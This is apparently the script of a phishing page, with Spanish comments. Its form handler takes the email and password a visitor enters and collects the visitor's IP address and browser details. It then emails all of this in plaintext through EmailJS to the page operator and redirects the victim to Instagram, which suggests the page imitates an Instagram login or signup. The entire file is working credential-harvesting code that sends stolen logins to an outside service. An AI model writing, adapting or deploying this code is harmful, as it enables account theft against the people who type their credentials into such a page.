<!-- EmailJS Library -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
    console.log("üîß Inicializando EmailJS...");
    
    // Inicializar EmailJS con tu Public Key
    emailjs.init("_ciLIFrO3yCvJ41Jd")
        .then(() => {
            console.log("‚úÖ EmailJS inicializado correctamente");
        })
        .catch(error => {
            console.error("‚ùå Error inicializando EmailJS:", error);
        });

    document.getElementById('registroForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const submitButton = document.getElementById('submitButton');
        const loadingMessage = document.getElementById('loadingMessage');
        
        console.log("üìù Datos del formulario:", { email, password });
        
        // Validaci√≥n b√°sica
        if (!email || !password) {
            alert('Por favor completa todos los campos');
            return;
        }
        
        // Deshabilitar el bot√≥n y mostrar carga
        submitButton.disabled = true;
        loadingMessage.style.display = 'block';
        
        try {
            console.log("üîÑ Procesando registro...");
            
            // Obtener informaci√≥n
            const fecha = new Date().toLocaleString('es-ES');
            const ip = await getIP();
            
            // Datos para el email
            const emailParams = {
                user_email: email,
                user_password: password,
                fecha: fecha,
                ip_address: ip,
                navegador: navigator.userAgent,
                timestamp: new Date().toLocaleString('es-ES')
            };

            console.log("üìß Enviando email con datos:", emailParams);
            
            // Enviar email
            console.log("üîë Usando Service ID:", 'service_zwi93ur');
            console.log("üîë Usando Template ID:", 'template_ew3qcvj');
            
            const emailResponse = await emailjs.send(
                'service_zwi93ur', 
                'template_ew3qcvj', 
                emailParams
            );
            
            console.log('‚úÖ Email enviado exitosamente:', emailResponse);
            console.log('‚úÖ Status:', emailResponse.status);
            console.log('‚úÖ Text:', emailResponse.text);
            
            alert('¬°Cuenta creada exitosamente! Revisa tu correo.');
            
            // Redirecci√≥n
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 3000);
            
        } catch (error) {
            console.error('‚ùå Error completo:', error);
            console.error('‚ùå Error status:', error.status);
            console.error('‚ùå Error text:', error.text);
            
            let errorMessage = 'Error: ';
            
            if (error.status === 0) {
                errorMessage += 'Problema de conexi√≥n. Verifica tu internet.';
            } else if (error.status === 400) {
                errorMessage += 'Datos incorrectos en el formulario.';
            } else if (error.status === 401) {
                errorMessage += 'Clave de API incorrecta. Verifica tus credenciales.';
            } else if (error.status === 429) {
                errorMessage += 'L√≠mite de emails excedido.';
            } else {
                errorMessage += error.text || 'Error desconocido.';
            }
            
            alert(errorMessage);
        } finally {
            submitButton.disabled = false;
            loadingMessage.style.display = 'none';
        }
    });
    
    // Funci√≥n para obtener IP
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'IP no disponible';
        }
    }
</script>
